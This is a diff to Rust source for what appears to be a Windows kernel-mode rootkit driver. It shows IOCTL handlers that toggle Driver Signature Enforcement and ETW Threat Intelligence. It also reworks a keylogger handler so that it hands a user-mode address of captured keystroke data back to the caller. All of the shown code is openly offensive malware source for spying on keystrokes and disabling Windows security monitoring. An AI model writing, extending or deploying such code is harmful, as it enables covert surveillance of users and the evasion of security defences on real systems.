@@ -1,11 +1,13 @@
 use {
     alloc::boxed::Box, 
     hashbrown::HashMap,
-    super::keylogger::set_keylogger_state,
-    shared::structs::{Keylogger, DSE, ETWTI},
-    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
-    shared::ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER, IOCTL_ETWTI}, 
-    crate::{handle, misc::{etwti::Etw, dse::Dse}, utils::ioctls::IoctlHandler}, 
+    super::keylogger::{get_user_address_keylogger, USER_ADDRESS},
+    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS, STATUS_UNSUCCESSFUL},
+    crate::{handle, misc::{dse::Dse, etwti::Etw}, utils::ioctls::IoctlHandler}, 
+    shared::{
+        ioctls::{IOCTL_ENABLE_DSE, IOCTL_ETWTI, IOCTL_KEYLOGGER}, 
+        structs::{DSE, ETWTI}
+    }, 
 };
 
 /// Registers the IOCTL handlers for misc-related operations.
@@ -30,12 +32,25 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
         }
     }) as IoctlHandler);
 
-    // Start / Stop Keylogger
+    // Start Keylogger
     ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        let status = unsafe { handle!(stack, set_keylogger_state, Keylogger) };
-        unsafe { (*irp).IoStatus.Information = 0 };
+        unsafe {
+            if USER_ADDRESS == 0 {
+                USER_ADDRESS = match get_user_address_keylogger()  {
+                    Some(addr) => addr as usize,
+                    None => return STATUS_UNSUCCESSFUL,
+                };
+            }
+    
+            let output_buffer = (*irp).AssociatedIrp.SystemBuffer;
+            if !output_buffer.is_null() {
+                *(output_buffer as *mut usize) = USER_ADDRESS;
+            }
+    
+            (*irp).IoStatus.Information = core::mem::size_of::<usize>() as u64;
+        }
 
-        status
+        STATUS_SUCCESS
     }) as IoctlHandler);
 
     // Responsible for enabling/disabling ETWTI.
